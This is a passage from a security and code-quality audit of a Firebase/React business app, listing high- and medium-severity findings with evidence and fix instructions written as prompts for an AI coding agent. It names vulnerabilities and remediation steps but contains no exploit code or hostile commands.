   dualWriteService. Remove the `firebase/database` imports once nothing uses them.
4. Delete the HYBRID HEAL block (226-275) and the "more items wins" merge
   (277-301). The latter silently resurrects deleted records and must not survive.
5. Replace localStorage-as-a-write-target with Firestore's own offline
   persistence (enableIndexedDbPersistence / persistentLocalCache). Keep
   localStorage only as a fast paint cache if measurement shows it helps — never as
   a store of record.
6. Surface every failure. Remove all `.catch(() => {})`. Writes must return a
   promise the caller can await; failures must produce a user-visible toast (the
   ToastProvider already exists at src/components/shared/Toast.jsx) and a Sentry
   event. Add optimistic UI with rollback on failure so the interface never claims
   success it did not achieve.
7. Add a `pending_writes` indicator so users know when data has not yet synced.

EDGE CASES
- Users currently offline with unsynced localStorage data must not lose it — the
  migration must run client-side on next load for such users, or you must accept
  and document the loss. Prefer a one-time client-side flush before cut-over.
- Records that exist in both stores with different content need a documented
  resolution rule (prefer Firestore, log the divergence for manual review).
- Deletes: confirm a record deleted in Firestore is not resurrected from RTDB
  during the migration window.
- Firestore's 1 MiB document limit — the org profile currently stores base64
  images (see M-1); check sizes before migrating.

MUST NOT BREAK
- Offline-first rendering: the app must still paint instantly from cache.
- Real-time updates via listenSection.

VERIFY
- Run the migration in staging and review the reconciliation report for zero
  unexplained divergences.
- Simulate a Firestore write failure (offline, or rules denial) and confirm the
  user sees an explicit error and the UI rolls back.
- Confirm a deleted record stays deleted across a reload.
```

---

## H-8 · Onboarding gate is dead code; result computed and discarded

**Severity:** HIGH · **Difficulty:** Low (1 day)

**Evidence** — `src/context/AuthContext.jsx:62-68`:

```js
try {
  await userHasOrganization(firebaseUser.uid);   // ← result never assigned
  setNeedsOnboarding(false);                     // ← always false
} catch (err) {
  console.warn("Could not check onboarding status:", err.message);
  setNeedsOnboarding(false);                     // ← also false
}
```

`userHasOrganization` (lines 25-53) performs **three sequential network round-trips** — a Firestore memberships query, a Firestore user-doc read, and an RTDB read — and its boolean return value is thrown away. `needsOnboarding` is initialized `false` (line 22) and set to `false` on both branches, so the guard at `App.jsx:233` can never fire.

**Impact:** Users who sign in with Google without an organization skip onboarding entirely and land in a broken app with no org profile. Three wasted round-trips are added to every sign-in.

### AI implementation prompt

```
Fix the dead onboarding gate in EdgeOS auth.

INSPECT FIRST
- src/context/AuthContext.jsx lines 20-77: needsOnboarding initialised false (22),
  userHasOrganization (25-53) making three sequential network calls, and the
  onAuthStateChanged handler (55-77) which awaits it and DISCARDS the result,
  setting needsOnboarding=false on both the success and error branches.
- src/App.jsx lines 233-235 — the guard that consequently never fires.
- src/components/Registration.jsx — the onboarding UI it should route to.
- src/context/OrgContext.jsx lines 16-25 — fetchOrganizations is gated on
  !needsOnboarding.

IMPLEMENT
1. Capture the result: `const hasOrg = await userHasOrganization(uid);
   setNeedsOnboarding(!hasOrg);`
2. Decide the failure policy deliberately. On a network error the current code
   assumes the user HAS an org. Safer is to retry with backoff and, if still
   failing, show a retry screen rather than dropping the user into an app with no
   org context. Implement retry-then-error, not silent pass.
3. Make the check fast and correct. Three sequential round-trips on every sign-in
   is wasteful — run the Firestore checks in parallel with Promise.allSettled and
   drop the legacy RTDB check once the C-9/H-7 migration lands. Short-circuit on
   the local check that already exists (orgStore.getLocalOrgIds, line 26).
4. Verify the interaction with OrgContext: while needsOnboarding is true,
   fetchOrganizations must not run, and OrgContext must not call
   ensureLocalOrg (OrgContext.jsx:67) — which currently papers over the missing org
   by fabricating a local workspace, hiding the bug.
5. Audit ensureLocalOrg: creating a phantom local org whenever no remote org is
   found (OrgContext.jsx:66-72 and 91) means a transient network failure silently
   forks the user into an empty workspace. Gate it behind an explicit offline state
   instead.

EDGE CASES
- Google sign-in for a brand-new user → must land on Registration.
- Google sign-in for an existing user → must go straight to the hub, no flicker
  through the onboarding screen.
- Email signup: AuthContext.signup (line 86) bypasses onAuthStateChanged via
  signupInProgressRef — confirm that path still sets state correctly.
- A user invited to an existing org (once invitations exist) must NOT be sent
  through org creation.

MUST NOT BREAK
- Existing users must not be re-onboarded. Test with an account that has an org in
  Firestore memberships, one with only a legacy RTDB org, and one with only
  localStorage.

VERIFY
- New Google account → Registration renders.
- Existing account → hub renders directly.
- Simulate offline during sign-in → retry UI, not a phantom empty workspace.
```

---

## H-9 · No role-based access control despite a roles data model

**Severity:** HIGH · **Difficulty:** Medium (1 week)

**Evidence:** Memberships are written with a `role` field (`dualWriteService.js:93`, `OrgContext.jsx:135`):

```js
const membershipData = { organization_id: orgId, user_id: user.uid, role: 'owner', created_at: timestamp };
```

But grepping `src/` shows the role is **never read** for any access decision. There is no permission check before any destructive or sensitive action. Every member of an org can:

- View and edit all salary data (`Employees.jsx`)
- View and edit bank details and GSTIN (`CompanyProfile.jsx`)
- Read the org's Gmail App Password (it is in the client-held profile object)
- Delete records, employees, customers and invoices
- Issue legally binding documents on behalf of the company

There is also **no invitation flow** — no way to add a second user to an organization at all. `fetchOrganizations` supports multiple orgs but nothing creates a second membership.

**Impact:** The product cannot be sold to any organization with more than one employee, which is its entire stated market ("all-in-one business suite for top-tier organizations"). Any junior employee has founder-level access.

### AI implementation prompt

```
Implement role-based access control and team invitations for EdgeOS. The
memberships documents already carry a `role` field (written in
dualWriteService.js:93 and OrgContext.jsx:135) but it is never read anywhere in
src/, and there is no way to invite a second user to an organization.

INSPECT FIRST
- src/services/dualWriteService.js lines 88-95 and src/context/OrgContext.jsx lines
  126-137 — where memberships and roles are created.
- src/context/OrgContext.jsx lines 27-59 — fetchOrganizationIds, the only place
  memberships are read (it ignores role entirely).
- src/components/Employees.jsx, CompanyProfile.jsx, InternRecords.jsx,
  financial/InvoiceList.jsx — the sensitive surfaces that need gating.
- firestore.rules from the C-1 work — RBAC must be enforced there, not only in UI.

IMPLEMENT
1. Define the role model explicitly in a shared module: owner (everything incl.
   billing, deletion, member management), admin (everything except billing and
   owner removal), member (create/edit documents, no salary or bank data, no
   deletion), viewer (read-only). Write it down in docs/.
2. Enforce in firestore.rules FIRST — the memberRole() helper from C-1 gates
   writes per collection and per field. Field-level: salary on employees, and the
   bank/GST/secret fields on organizations, must be readable only by owner/admin.
   Note that Firestore cannot do partial-document field security, so move
   salary and bank details into separate documents
   (employee_compensation/{empId}, org_financial/{orgId}) that rules can protect.
   This is the key architectural change — plan it before writing rules.
3. Add a usePermissions() hook returning the current user's role and boolean
   capabilities, sourced from the membership doc. Gate UI with it — hide rather
   than disable where the existence of the action is itself sensitive.
4. Build the invitation flow: an owner/admin creates an `invitations/{token}` doc
   with {orgId, email, role, expires_at, accepted_at}; an authenticated
   serverless function emails the link (reusing the secured email path from C-5);
   accepting creates the membership with the deterministic {uid}_{orgId} ID from
   C-1. Handle already-a-member, expired, wrong-email, and revoked invitations.
5. Add a Team Management screen: list members with roles, change role, remove
   member, resend/revoke invitation. Removing a member must delete their
   membership doc so rules deny them immediately.
6. Write every membership change to the audit_log from C-2.

EDGE CASES
- The last owner cannot be removed or demoted — enforce server-side.
- A user removed mid-session must lose access on their next read (rules handle
  this) and the client must detect the denial and sign them out of that org
  gracefully rather than showing an error loop.
- A user belonging to multiple orgs has a different role in each — usePermissions
  must key off the ACTIVE org (coordinate with H-2's per-org store).
- Moving salary/bank data to separate documents is a data migration — write it,
  and update every read site.

MUST NOT BREAK
- Existing single-user orgs: their owner membership must grant everything they
  have today. Migrate existing membership docs to the new ID scheme and verify.
- All existing document generation flows must still work for the owner role.

VERIFY
- Add rules tests: a `member` cannot read employee_compensation or org_financial;
  a `viewer` cannot write anything; an `admin` cannot change billing.
- Invite a second user end to end and confirm their role limits both the UI and
  direct Firestore access from the console.
```

---

## H-10 · 25 dependency vulnerabilities, 3 critical

**Severity:** HIGH · **Difficulty:** Medium (2 days)

**Evidence** — `npm audit`: `{"low":2,"moderate":5,"high":15,"critical":3,"total":25}`

Notable, with direct relevance to this codebase:

| Package | Severity | Advisory | Relevance |
|---|---|---|---|
| `jspdf` | **CRITICAL** | PDF Object Injection via FreeText color | Core dependency — every generated document |
| `protobufjs` | **CRITICAL** | Arbitrary code execution | Firebase transitive |
| `nodemailer` | HIGH | CRLF injection in `List-*` headers | **Directly used by the open relay in C-5** |
| `@grpc/grpc-js` | HIGH | Malformed request crashes server | Firebase transitive |
| `postcss` | HIGH | XSS via unescaped `</style>` | Build chain |
| `js-yaml`, `minimatch`, `picomatch`, `brace-expansion`, `flatted`, `browserslist`, `nanoid` | HIGH | ReDoS / DoS / OOM | Build + runtime |

There is no automated dependency scanning: no `.github/` directory exists, so no Dependabot and no CI audit.

### AI implementation prompt

```
Remediate EdgeOS dependency vulnerabilities and prevent regression. Baseline:
`npm audit` reports 25 vulnerabilities — 3 critical, 15 high.

INSPECT FIRST
- Run `npm audit --json` and `npm ls <pkg>` for each finding to separate direct
  dependencies from transitive ones.
- package.json dependencies — jspdf, nodemailer, firebase, xlsx are the
  security-relevant direct deps.
- Note there is no .github/ directory, so no Dependabot and no CI audit exist.

IMPLEMENT
1. Triage rather than blanket-upgrading. For each advisory decide: does the
   vulnerable code path exist in this app?
   - jspdf (CRITICAL, PDF Object Injection via FreeText): jspdf is central —
     src/services/pdfService.js is 1,115 lines built on it. Upgrade to a patched
     version and regression-test EVERY document type (offer letter, certificate,
     NDA, MoU, invoice, quotation, proforma) by diffing generated PDFs.
   - nodemailer (HIGH, CRLF header injection): directly exploitable through the
     currently-unauthenticated api/email.js. Upgrade AND add the header-injection
     input validation described in the C-5 prompt. Both are required.
   - protobufjs / @grpc/grpc-js: transitive under firebase. Upgrade the firebase
     SDK to pull fixed versions; use npm overrides only if the SDK lags.
   - Build-chain-only advisories (postcss, browserslist, js-yaml, minimatch,
     picomatch, brace-expansion, flatted, nanoid): lower real risk, but they run in
     CI on your source — upgrade them too, they are cheap.
2. Run `npm audit fix` first for non-breaking fixes; handle the rest deliberately.
   Do NOT run `npm audit fix --force` blindly — it will bump majors (jspdf is
   already at ^4.2.0) and can silently change PDF output.
3. Add npm `overrides` in package.json for transitive deps that cannot be lifted
   by upgrading the parent.
4. Create .github/dependabot.yml (weekly, grouped minor/patch) and a CI workflow
   that runs `npm audit --audit-level=high` and fails the build.
5. Add a SECURITY.md documenting how to report vulnerabilities.

EDGE CASES
- xlsx (SheetJS) has a history of prototype-pollution advisories and the npm
  registry copy is often stale — verify the installed version against the
  vendor's own distribution, and confirm the bulk CSV/XLSX import path
  (src/components/bulk/shared/CSVUploader.jsx) validates input.
- A jspdf major bump may change fonts, spacing or image handling. Diff the output
  of every document type visually before accepting.
- react 19 + framer-motion 12 + @xyflow/react 12 have peer-dependency
  interactions; run a full build and click through the org chart and animated
  landing page after any bump.

MUST NOT BREAK
- PDF generation fidelity for all seven document types.
- Email sending.
- The org chart (@xyflow/react) and bulk import.

VERIFY
- `npm audit --audit-level=high` exits clean.
- Generate one of each document type and diff against pre-upgrade PDFs.
- Full `npm run build` succeeds and the app functions end to end.
```

---

## H-11 · No security headers; conflicting deployment configuration

**Severity:** HIGH · **Difficulty:** Low (1 day)

**Evidence:** The repository contains **both** `vercel.json` and `netlify.toml`, describing two different deployment targets. `netlify.toml` has no `/api` handling at all, so **deploying to Netlify silently breaks both serverless functions** (`api/email.js` and `api/nvidia.js`) — the SPA catch-all would return `index.html` for `/api/*`.

Neither file sets a single security header. Missing:

- `Content-Security-Policy` — would have mitigated the XSS in C-8
- `Strict-Transport-Security`
- `X-Frame-Options` / `frame-ancestors` — the app is clickjackable
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy`
- `Permissions-Policy`

`vercel.json`'s rewrite `"source": "/(.*)" → "/index.html"` also has no exclusion for `/admin`, so the admin entry point built by `vite.config.js:88` may not be served correctly in production.

### AI implementation prompt

```
Fix EdgeOS deployment configuration and add security headers.

INSPECT FIRST
- vercel.json (rewrites /api/(.*) then /(.*) → /index.html; no headers block, no
  /admin exclusion).
- netlify.toml (publish dist, catch-all redirect to /index.html; NO /api handling —
  serverless functions would 404/return HTML on Netlify).
- vite.config.js lines 83-90 — two rollup entry points, main and admin/index.html.
- api/email.js and api/nvidia.js — Vercel-style handlers (req, res).

IMPLEMENT
1. Pick ONE deployment target and delete the other config. The api/ handlers use
   the Vercel signature, so Vercel is the path of least resistance — confirm with
   the user, then remove netlify.toml (or port the functions to Netlify Functions
   and remove vercel.json). Shipping both is how a deploy silently loses its API.
2. Add a headers block with:
   - Content-Security-Policy: start in Report-Only, tune, then enforce. Must allow
     Firebase (*.googleapis.com, *.firebaseio.com, *.firebasedatabase.app),
     Google Fonts, and the app's own origin; disallow unsafe-inline for scripts.
     Note the app uses 2,169 inline STYLE attributes — style-src will need
     'unsafe-inline' initially; plan to reduce that (see Q-2).
   - Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
   - X-Frame-Options: DENY and frame-ancestors 'none'
   - X-Content-Type-Options: nosniff
   - Referrer-Policy: strict-origin-when-cross-origin
   - Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
3. Fix the /admin route: add an explicit rewrite so /admin serves
   /admin/index.html in production, matching the dev middleware at
   vite.config.js:18-28. Verify against the built dist/ layout.
4. Add cache headers: immutable long-cache for /assets/* (content-hashed),
   no-cache for index.html.
5. Consider blocking /admin at the edge by IP allowlist or an auth proxy as
   defense in depth alongside the C-2 fix.

EDGE CASES
- CSP will break things you did not anticipate — the QR code generator, jsPDF's
  canvas usage, html2canvas image loading with crossOrigin, and Firebase's
  websocket transport. Run in Report-Only for a full QA pass before enforcing.
- The /portal route is loaded by external recipients — verify CSP does not break
  PDF download there.
- data: URIs are used heavily for logos/signatures/stamps (see M-1); img-src must
  allow data:.

MUST NOT BREAK
- Serverless functions must keep working after the config consolidation — test
  /api/email and /api/nvidia on a real preview deployment, not just locally.
- The admin panel must remain reachable at /admin.

VERIFY
- Deploy a preview and run securityheaders.com — target grade A.
- Confirm no CSP violations in the console across every route, including PDF
  generation and the recipient portal.
- Confirm /api/* returns JSON, not index.html.
```

---

## H-12 · Zero tests and zero CI

**Severity:** HIGH · **Difficulty:** High (ongoing)

**Evidence:** No test files, no test runner config, no `.github/` directory.

```
$ find . -name "*.test.*" -o -name "*.spec.*" -o -name "vitest.config*" -o -name "jest.config*"
(no results)
$ ls .github
ls: cannot access '.github': No such file or directory
```

`package.json` has no `test` script. Nothing verifies GST arithmetic, PDF generation, plan-limit logic, the dual-write layer, or the signature flow — in an application whose entire output is **legally binding documents and tax invoices**.

**Impact:** No regression safety on financial calculations. Every change is a gamble, and the codebase cannot be refactored with confidence — which is precisely what the rest of this audit requires.

### AI implementation prompt

```
Establish a testing foundation and CI for EdgeOS. There are currently zero tests,
no test runner, no npm test script, and no .github directory.

INSPECT FIRST
- package.json scripts (dev, build, lint, preview — no test).
- The highest-risk pure logic: src/services/planConfig.js (limits),
  src/services/documentStore.js (nextId, notifications, recurring),
  src/components/financial/QuotationForm.jsx and InvoiceForm.jsx (GST, discount,
  CGST/SGST split, grand total), src/services/pdfService.js (1,115 lines).
- src/services/orgStore.js — the data layer everything depends on.

IMPLEMENT — in priority order, do not try to reach high coverage immediately
1. Install vitest + @testing-library/react + jsdom. Add `test`, `test:watch` and
   `test:coverage` scripts.
2. Start where a bug costs money or legal standing:
   - GST and totals arithmetic: subtotal, discount (percent and flat), taxable
     amount, GST at each rate, CGST/SGST split vs IGST, rounding to 2 decimals,
     grand total. Include the classic failure cases: 0% rate, 100% discount,
     quantities of 0, very large amounts, and floating-point rounding
     (18% of 1234.55).
   - documentStore.nextId: prove the current `matching.length + 1` implementation
     produces duplicates after a delete — then fix it (see D-2) and prove the fix.
   - planConfig: isLimitReached / getRemaining / getUsagePercentage at boundaries,
     including the Infinity cases.
3. Add @firebase/rules-unit-testing tests for the C-1 security rules. These are the
   single highest-value tests in the codebase — they assert that tenant isolation
   actually holds.
4. Component tests for the critical flows: OfferForm submit, QuotationForm line
   item add/remove/reorder (which the H-5 purity fix touches), and the
   RecipientPortal signature flow.
5. Add Playwright E2E for three journeys: sign up → create org → generate an offer
   letter → download PDF; create an invoice → send a portal link → sign it as a
   recipient; and the auth guard (unauthenticated user cannot reach /hub).
6. Create .github/workflows/ci.yml running on every PR: install, `npm run lint`
   (--max-warnings 0), `npm test`, `npm run build`, and `npm audit
   --audit-level=high`. Make it a required status check.
7. Set a coverage floor that ratchets — start at whatever the first tests achieve,
   and require it not to decrease.

EDGE CASES
- Firebase must be mocked or run against the emulator suite; add firebase.json
  emulator config (coordinate with C-1) and a `test:emulator` script.
- pdfService uses jsPDF and canvas, which need jsdom shims or should be tested via
  Playwright against real output instead.
- Do not write tests that merely assert current behaviour where that behaviour is
  a bug documented in this audit — fix first, then lock in.

MUST NOT BREAK
- Nothing; this is purely additive. But CI becoming a required check will block
  merges until the existing 86 lint errors are fixed (H-5) — sequence H-5 first or
  start CI with lint non-blocking and tighten immediately after.

VERIFY
- `npm test` passes locally and in CI.
- Deliberately break a GST calculation and confirm a test fails.
- Deliberately weaken a security rule and confirm a rules test fails.
```

---

## H-13 · TypeScript files with no TypeScript configuration

**Severity:** HIGH · **Difficulty:** Medium (3 days)

**Evidence:** The repository contains 8 `.ts` files totalling ~2,800 lines — including the most complex logic in the product:

```
src/services/companyMemory.ts    988 lines
src/services/cofounderAI.ts      681 lines
src/services/employeeAI.ts       331 lines
src/services/decisionEngine.ts   265 lines
src/services/followUpEngine.ts   189 lines
src/services/taskStore.ts        102 lines
src/hooks/useTaskDeadlineMonitor.ts
```

But there is **no `tsconfig.json`** anywhere, and no `typescript` dependency in `package.json`. Vite/esbuild strips the types and never checks them.

**Impact:** Every type annotation in ~2,800 lines of the most intricate code is decoration. `@types/react` and `@types/react-dom` are installed but unused. The codebase pays TypeScript's syntax cost and receives none of its safety.

### AI implementation prompt

```
Make TypeScript real in EdgeOS. There are 8 .ts files (~2,800 lines, including the
988-line companyMemory.ts and 681-line cofounderAI.ts) but NO tsconfig.json and no
typescript dependency — esbuild strips the annotations and nothing type-checks.

INSPECT FIRST
- The .ts files: src/services/{companyMemory,cofounderAI,employeeAI,decisionEngine,
  followUpEngine,taskStore}.ts and src/hooks/useTaskDeadlineMonitor.ts.
- package.json — @types/react and @types/react-dom are installed but typescript is
  not.
- eslint.config.js — currently JS-only rules.

IMPLEMENT
1. Add typescript, @typescript-eslint/parser and @typescript-eslint/eslint-plugin.
   Create tsconfig.json with `strict: true`, `noUncheckedIndexedAccess: true`,
   `allowJs: true`, `checkJs: false`, jsx: react-jsx, and moduleResolution bundler.
2. Add a `typecheck` script (`tsc --noEmit`) and run it in CI.
3. Fix the errors this surfaces in the existing .ts files. Expect a substantial
   number — 2,800 lines have never been checked. Work file by file, smallest first
   (taskStore, useTaskDeadlineMonitor, followUpEngine, decisionEngine, employeeAI,
   cofounderAI, companyMemory).
4. Define shared domain types in src/types/: Organization, Employee, Customer,
   FinancialDocument (with the invoice/quotation/proforma discriminated union),
   Record, Task, CrmLead, Membership, Plan. Derive them from what
   orgStore.KEYED_SECTIONS actually stores. These types are the missing schema
   documentation for this codebase.
5. Type the data layer next: give orgStore, documentStore and storageService real
   signatures. This is where type safety pays most, because every component reads
   through them and currently receives `any`.
6. Then migrate .jsx → .tsx incrementally, highest-risk first: the financial forms
   (QuotationForm, InvoiceForm, ProformaInvoiceForm) where a wrong type is a wrong
   invoice. Do NOT attempt a big-bang migration.
7. Wire eslint.config.js to typescript-eslint for the .ts/.tsx files.

EDGE CASES
- `strict: true` on files never type-checked will produce a large error count. If
  it is unmanageable, start with strict:false plus noImplicitAny:true, fix, then
  ratchet each strict flag on one at a time. Do not use `any` as the escape hatch —
  use `unknown` and narrow.
- Firebase SDK types are good; let them flow through rather than re-declaring.
- The JSON-shaped data coming back from Firestore is genuinely `unknown` — add
  runtime validation (zod) at the boundary in orgStore rather than asserting.

MUST NOT BREAK
- The build. Type errors must not block `npm run build` initially (esbuild ignores
  them anyway) — introduce `typecheck` as a separate CI gate so you can land it
  incrementally.
- Runtime behaviour: this should be a types-only change. Any behavioural fix you
  discover should be a separate, deliberate commit.

VERIFY
- `npm run typecheck` exits 0.
- CI fails when a type error is introduced.
```

---

## H-14 · Interval polling instead of real-time subscriptions

**Severity:** HIGH · **Difficulty:** Low (1 day)

**Evidence:**

- `src/App.jsx:182-188` — notifications re-read **every 3 seconds**, for the entire session, on every page.
- `src/components/tasks/TasksPage.jsx:83` — `setInterval(reload, 5000)`.
- `src/hooks/useTaskDeadlineMonitor.ts:60` — hourly, which is reasonable.

The 3-second poll runs `documentStore.getNotifications()` → `orgStore.getSection('fin_notifs')`, which reads the in-memory cache — so it is cheap per call, but it re-renders `AppContent` (the entire app shell, including the sidebar and the CopilotPanel) **20 times per minute, forever**, because `setNotifications` receives a new array reference each time.

Meanwhile `orgStore.listenSection` (`orgStore.js:436-477`) already implements proper Firestore `onSnapshot` subscriptions — the correct mechanism exists and is not used here.

**Impact:** Constant needless re-render of the top-level component, measurable battery and CPU drain on mobile, and notifications that are still up to 3 seconds stale despite the cost.

### AI implementation prompt

```
Replace interval polling with real-time subscriptions in EdgeOS.

INSPECT FIRST
- src/App.jsx lines 178-188 — a 3-second setInterval calling
  documentStore.getNotifications() and setNotifications with a fresh array
  reference each tick, re-rendering the entire AppContent shell 20×/minute.
- src/components/tasks/TasksPage.jsx line 83 — setInterval(reload, 5000).
- src/hooks/useTaskDeadlineMonitor.ts line 60 — hourly; this one is fine, leave it.
- src/services/orgStore.js lines 436-477 — listenSection already implements correct
  Firestore onSnapshot subscriptions for both KEYED_SECTIONS and METADATA_SECTIONS.
  fin_notifs is in METADATA_SECTIONS and tasks is in KEYED_SECTIONS, so both are
  already supported.

IMPLEMENT
1. Replace the App.jsx notification poll with orgStore.listenSection('fin_notifs',
   cb), returning the unsubscriber from the effect. Make sure the effect re-runs
   when the active org changes and tears down the old subscription.
2. Replace the TasksPage poll with listenSection('tasks', cb) the same way.
3. Stop the needless re-renders: only call setNotifications when the content has
   actually changed (compare by id list or a cheap hash), so an unchanged snapshot
   does not produce a new array reference.
4. Memoize what the poll was thrashing: unreadCount (App.jsx:176) recomputes on
   every render — wrap in useMemo. Consider moving notification state into its own
   context so a notification update does not re-render the whole app shell,
   sidebar and CopilotPanel.
5. Audit for other unnecessary re-render sources in AppContent while you are here:
   the isMobile resize listener (App.jsx:171-175) fires on every resize event with
   no debounce — debounce it or use a matchMedia listener.

EDGE CASES
- Subscriptions must be torn down on logout and on org switch, or they leak and
  can deliver another org's data (coordinate with H-2's per-org store).
- Firestore onSnapshot fires once immediately with cached data — make sure that
  does not produce a spurious "new notification" toast on mount.
- Offline: onSnapshot serves from cache and reconnects automatically; confirm the
  UI does not show a stale-forever state.

MUST NOT BREAK
- The notification panel, unread badge, clear-all, and click-to-navigate behaviour
  (App.jsx:191-213).
- Task board live updates across users.

VERIFY
- Profile with React DevTools: AppContent should no longer re-render every 3
  seconds at idle.
- Confirm a notification created in one browser appears in another within ~1s.
- Confirm subscriptions are removed on logout (no console errors, no further
  network activity).
```

---

# PART III — MEDIUM SEVERITY FINDINGS

---

### M-1 · Base64 images stored inline in documents

`src/services/imageUploadService.js:35` and `src/utils/imageUtils.js:52` convert logos, signatures and stamps to base64 data URLs via `canvas.toDataURL()`. These are stored as ordinary profile fields (`logo_url`, `signature_url`, `stamp_url` in `orgStore.js:32`).

Consequences: Firestore's **1 MiB document limit** can be hit by the org profile; `localStorage`'s 5–10 MB quota is consumed (and `persistToLS` at `orgStore.js:60-67` only warns on failure, so writes silently stop persisting); base64 is ~33% larger than binary; and every org read transfers the images again with no CDN caching.

**Fix prompt:** Move images to Firebase Storage. Upload the binary, store only the download URL in the profile, add `image/*` MIME and size validation (reject > 2 MB before upload), generate resized variants, set long cache headers, and write a migration that extracts existing base64 blobs to Storage and rewrites the fields. Ensure `imageUtils.ensureBase64` still works for jsPDF by fetching from the URL at PDF-generation time (it already has this path at `imageUtils.js:4`). Verify the org profile document drops well below 1 MiB and PDFs still render logos and signatures.

---

### M-2 · Collision-prone, predictable document ID generation

`documentStore.nextId` (`documentStore.js:98-103`) computes `matching.length + 1`. Delete `INV-2026-0002` from a set of three and the next ID is `INV-2026-0003` — a **duplicate**, which then overwrites the existing document via `setItem`. Two users creating concurrently get the same ID. The year `2026` is hardcoded.

Notification IDs use `Date.now()` (`documentStore.js:113`), which collides for notifications created in the same millisecond, and `deleteNotification` filters by that id — deleting both.

**Fix prompt:** Separate the storage key from the display number. Use `crypto.randomUUID()` for the document key. Generate the human-readable sequence number server-side via a Firestore transaction on a per-org, per-type, per-year counter document so it is gap-free and unique under concurrency. Derive the year from the document date, not a literal. Use `crypto.randomUUID()` for notification IDs. Migrate existing documents by keeping their current display numbers and assigning new UUID keys. Test: create documents concurrently in two tabs and assert no duplicates; delete a middle document and assert the next number does not collide.

---

### M-3 · Firestore reads fan out to 10 collections on every load

`orgStore.load` (`orgStore.js:192-198`) issues 10 parallel `getDocs` queries plus 2 document reads on every app load — **and then**, for any section that comes back empty, up to 10 additional *sequential* RTDB reads in the healing loop (`orgStore.js:249-262`), each `await`ed inside a `for` loop.

For a new or lightly-used org (where most sections are empty) this is the worst case: 12 Firestore reads followed by ~11 serialized RTDB round-trips before the app is usable.

It also loads **every record the org has ever created** — there is no pagination anywhere in the data layer.

**Fix prompt:** Remove the healing loop (covered by H-7). Load only what the current route needs rather than all 10 sections eagerly — make section loading lazy and cached. Add pagination (`limit` + cursor) to `records`, `fin_docs`, `employees` and `crm_leads`, and update the consuming lists to paginate or virtualize. Measure the Firestore read count per session before and after; target a 10× reduction. Verify large orgs (1,000+ records) load in under 2 seconds.

---

### M-4 · No input validation or sanitization layer

There is no validation library in `package.json` and no schema validation anywhere. `orgStore.sanitize()` (`orgStore.js:44-53`) only strips `undefined` — it does not validate types, lengths, formats or ranges.

Consequences: GSTIN, IFSC, email, phone and URL fields accept anything; numeric fields accept negatives and `NaN` (a negative quantity produces a negative invoice); free-text fields are unbounded (a 10 MB company name is accepted); and no field is escaped on the way in, which feeds the XSS in C-8.

**Fix prompt:** Add zod. Define schemas for every entity in `src/schemas/` mirroring the domain types from H-13. Validate on form submit AND in the data layer before any write. Add format validators for Indian GSTIN (15-char pattern with checksum), IFSC (`^[A-Z]{4}0[A-Z0-9]{6}$`), PAN, email and phone. Enforce field length caps and numeric ranges (quantity > 0, rate ≥ 0, discount 0–100%). Mirror the constraints in `firestore.rules` so the server enforces them too. Surface validation errors inline in the forms. Test with boundary and malicious inputs.

---

### M-5 · Silent error swallowing throughout the codebase

`.catch(() => {})` appears on six RTDB writes in `orgStore.js` (lines 342, 384, 397, 408, 419, 428). Two empty catch blocks are flagged by ESLint (`orgStore.js:480`, `pdfService.js:151`). `console.warn`-and-continue is the default failure mode in `AuthContext` (lines 33, 42, 51, 65) and `OrgContext` (lines 38, 46, 55, 99).

The user is never told anything failed. 96 `console.*` calls ship to production.

**Fix prompt:** Establish an error-handling policy: recoverable errors get a user-visible toast plus a Sentry breadcrumb; unrecoverable errors get the boundary from H-4; expected conditions get neither. Replace every `.catch(() => {})` with real handling. Replace all 96 `console.*` calls with a logger utility that no-ops at debug level in production. Never leave a catch block empty — if a failure is genuinely ignorable, write a one-line comment saying why. Verify by forcing a write failure and confirming the user sees it.

---

### M-6 · Notifications are an unbounded array in one document

`documentStore.addNotification` (`documentStore.js:111-115`) does `notifs.unshift(...)` then `orgStore.setSection('fin_notifs', notifs)`, which writes the **entire array** to a single field on `org_metadata/{orgId}` (`orgStore.js:129-132`).

The array never truncates. Every new notification rewrites the whole history. At Firestore's 1 MiB document limit the write fails — and, per M-5, silently. The UI only ever shows 20 (`App.jsx:478`).

**Fix prompt:** Move notifications to their own collection `notifications` with an `orgId` field, matching the KEYED_SECTIONS pattern. Query with `orderBy('created_at','desc').limit(50)`. Add a TTL policy or a scheduled cleanup deleting read notifications older than 90 days. Add per-user read state (currently `read` is global to the org, so one user marking a notification read hides it from everyone). Verify with 10,000 notifications that writes stay fast and bounded.

---

### M-7 · Accessibility below any compliance baseline

Evidence across `src/`:

- Only **4** `aria-label` attributes in the entire application
- **28** `<div onClick>` handlers — not keyboard-reachable, no `role`, no `tabIndex`, no key handler
- `index.html:10` disables pinch-zoom (**WCAG 2.1 SC 1.4.4 failure**)
- No skip-link, no focus trap in the notification panel overlay (`App.jsx:453`) or any modal
- No `eslint-plugin-jsx-a11y` configured
- 459 hardcoded hex colors in `index.css` with no verified contrast ratios

**Fix prompt:** Add `eslint-plugin-jsx-a11y` and fix what it reports. Convert every `<div onClick>` to a `<button>` (or add `role`, `tabIndex={0}` and Enter/Space handlers). Remove `maximum-scale`/`user-scalable` from the viewport meta. Add a skip-to-content link. Implement focus trapping and Escape-to-close in the notification panel and all modals, restoring focus to the trigger on close. Add `aria-label` to every icon-only button (the sidebar, mobile top bar and table row actions are full of these). Audit all text/background pairs for WCAG AA contrast (4.5:1 body, 3:1 large) in both themes. Test the entire app with keyboard only and with a screen reader. Target Lighthouse Accessibility ≥ 95.

---

### M-8 · 13,302-line CSS file with 187 `!important` declarations

`src/index.css` is 250 KB / 13,302 lines — a single global stylesheet containing:

- **187** `!important` declarations (specificity wars)
- **459** hardcoded hex colors against only **62** CSS custom properties
- **62** media queries scattered throughout

Alongside it, **2,169** inline `style={{...}}` objects in JSX, which cannot be themed, cannot be cached, are re-created every render, and force `style-src 'unsafe-inline'` in any CSP (see H-11).

**Fix prompt:** Do not rewrite it wholesale. Instead: (1) extract a complete design-token layer — every color, space, radius, shadow and font-size becomes a custom property, and replace the 459 hardcoded hexes with tokens, which also fixes theming gaps; (2) split the file by feature and co-locate each part with its component so it code-splits (supports H-1); (3) eliminate `!important` by fixing the underlying specificity, working through them in descending frequency; (4) migrate the highest-traffic inline styles to classes, prioritizing those in list rows and other repeated renders. Verify with visual regression snapshots in both themes at three breakpoints — the goal is zero visual change.

---

